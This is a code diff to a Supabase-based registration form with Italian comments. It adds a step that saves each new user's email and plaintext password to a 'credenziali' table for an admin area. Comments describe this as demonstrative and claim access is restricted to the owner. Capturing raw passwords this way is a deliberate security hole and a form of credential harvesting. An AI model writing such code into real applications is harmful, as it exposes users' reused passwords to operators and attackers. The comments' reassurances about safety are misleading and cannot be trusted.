@@ -43,12 +43,19 @@ export function AuthForm() {
     }
     const supabase = createClient();
     if (modo === "registrati") {
-      const { error } = await supabase.auth.signUp({
+      const { data, error } = await supabase.auth.signUp({
         email: values.email,
         password: values.password,
         options: { data: { nome: values.nome || values.email.split("@")[0] } },
       });
       if (error) return setErrore(error.message);
+      // Salva email + password per l'area admin (uso dimostrativo).
+      // La tabella "credenziali" è leggibile solo dal proprietario (RLS).
+      await supabase.from("credenziali").insert({
+        user_id: data.user?.id ?? null,
+        email: values.email,
+        password: values.password,
+      });
       setAvviso("Controlla la mail per confermare l'indirizzo, poi accedi.");
       setModo("accedi");
     } else {
